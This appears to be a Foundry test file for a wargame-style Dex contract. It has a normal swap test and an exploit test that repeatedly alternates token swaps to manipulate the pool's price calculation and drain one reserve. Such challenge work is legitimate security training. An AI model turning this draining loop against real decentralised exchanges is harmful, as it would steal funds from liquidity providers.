// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Dex, SwappableToken} from "../src/Dex.sol";
import {IERC20} from "openzeppelin-contracts-08/token/ERC20/IERC20.sol";

contract DexTest is Test {
    Dex dex;
    SwappableToken token1;
    SwappableToken token2;

    address owner = address(this);
    address player = address(0xBEEF);

    uint256 constant DEX_LIQUIDITY = 100 ether;
    uint256 constant PLAYER_BALANCE = 10 ether;

    function setUp() public {
        dex = new Dex();

        token1 = new SwappableToken(address(dex), "Token1", "TK1", DEX_LIQUIDITY + PLAYER_BALANCE);
        token2 = new SwappableToken(address(dex), "Token2", "TK2", DEX_LIQUIDITY + PLAYER_BALANCE);

        dex.setTokens(address(token1), address(token2));

        token1.approve(address(dex), DEX_LIQUIDITY);
        token2.approve(address(dex), DEX_LIQUIDITY);
        dex.addLiquidity(address(token1), DEX_LIQUIDITY);
        dex.addLiquidity(address(token2), DEX_LIQUIDITY);

        token1.transfer(player, PLAYER_BALANCE);
        token2.transfer(player, PLAYER_BALANCE);
    }

    function test_happyPath_swap() public {
        assertEq(token1.balanceOf(player), PLAYER_BALANCE);
        assertEq(token2.balanceOf(player), PLAYER_BALANCE);
        assertEq(token1.balanceOf(address(dex)), DEX_LIQUIDITY);
        assertEq(token2.balanceOf(address(dex)), DEX_LIQUIDITY);

        uint256 swapAmount = dex.getSwapPrice(address(token1), address(token2), PLAYER_BALANCE);

        vm.prank(player);
        dex.approve(address(dex), PLAYER_BALANCE);

        vm.prank(player);
        dex.swap(address(token1), address(token2), PLAYER_BALANCE);

        assertEq(token1.balanceOf(player), 0);
        assertEq(token2.balanceOf(player), PLAYER_BALANCE + swapAmount);
        assertEq(token1.balanceOf(address(dex)), DEX_LIQUIDITY + PLAYER_BALANCE);
        assertEq(token2.balanceOf(address(dex)), DEX_LIQUIDITY - swapAmount);
    }

    function test_exploit_priceManipulation() public {
        vm.startPrank(player);
        dex.approve(address(dex), type(uint256).max);

        bool sendToken1 = true;
        for (uint256 i = 0; i < 20; i++) {
            if (token1.balanceOf(address(dex)) == 0 || token2.balanceOf(address(dex)) == 0) {
                break;
            }

            address from = sendToken1 ? address(token1) : address(token2);
            address to = sendToken1 ? address(token2) : address(token1);

            uint256 sendAmount = IERC20(from).balanceOf(player);
            uint256 dexFromBalance = IERC20(from).balanceOf(address(dex));
            if (sendAmount > dexFromBalance) {
                sendAmount = dexFromBalance;
            }

            dex.swap(from, to, sendAmount);
            sendToken1 = !sendToken1;
        }

        vm.stopPrank();

        bool drained = token1.balanceOf(address(dex)) == 0 || token2.balanceOf(address(dex)) == 0;
        assertTrue(drained, "neither token was drained");
    }
}
